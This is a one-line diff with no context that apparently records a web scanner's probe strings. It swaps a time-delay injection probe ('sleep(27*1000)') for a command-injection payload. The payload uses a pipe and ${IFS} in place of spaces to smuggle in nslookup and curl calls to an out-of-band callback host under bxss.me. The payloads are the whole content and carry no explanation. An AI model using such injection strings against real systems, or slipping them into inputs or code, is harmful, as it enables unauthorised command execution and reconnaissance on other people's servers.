@@ -1,1 +1,1 @@
-555"||sleep(27*1000)*wdtjrx||"
+|(nslookup${IFS}-q${IFS}cname${IFS}hiticxpturwvhe10c0.bxss.me||curl${IFS}hiticxpturwvhe10c0.bxss.me)
